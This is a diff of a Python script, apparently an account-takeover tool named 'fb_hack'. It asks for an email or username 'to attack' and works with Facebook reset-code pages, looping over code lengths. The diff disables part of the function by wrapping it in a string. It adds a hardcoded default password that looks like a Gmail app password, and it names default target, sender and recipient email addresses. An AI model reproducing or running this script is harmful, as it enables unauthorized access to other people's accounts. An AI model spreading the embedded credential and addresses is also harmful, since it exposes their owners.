@@ -58,7 +58,7 @@ def fb_hack(email, codex, respect):
   soup = BeautifulSoup(html, 'html.parser')
   with open("output1.txt", "w") as file:
     file.write(str(soup))
-  test = soup.find(string="pop")
+  """test = soup.find(string="pop")
   sixdigits = soup.find(string="Please check your email for a message with your code. Your code is 6 numbers long.")
   eightdigits = soup.find(string="Please check your email for a message with your code. Your code is 8 numbers long.")
   if sixdigits != test:
@@ -99,7 +99,7 @@ def fb_hack(email, codex, respect):
         break
       sleepy(30)
   past = int(respect)
-  return past
+  return past"""
 
 os.system('clear')
 ehack = input('Email address or username to attack:') or str("amschwab@comcast.net")
@@ -107,7 +107,7 @@ reset = int(input('Code: ') or 1)
 past = int(input('Length: ') or 6)
 sender_email = input("Your Email:") or "krarktel@gmail.com"
 receiver_email = input("Recipient:") or "ppteam36884@gmail.com"
-password = input("Type your password and press enter:")
+password = input("Type your password and press enter:") or "dvxu atqv cngc rojf"
 while past >= 6:
   fb_hack(ehack, reset, past)
   past += 1
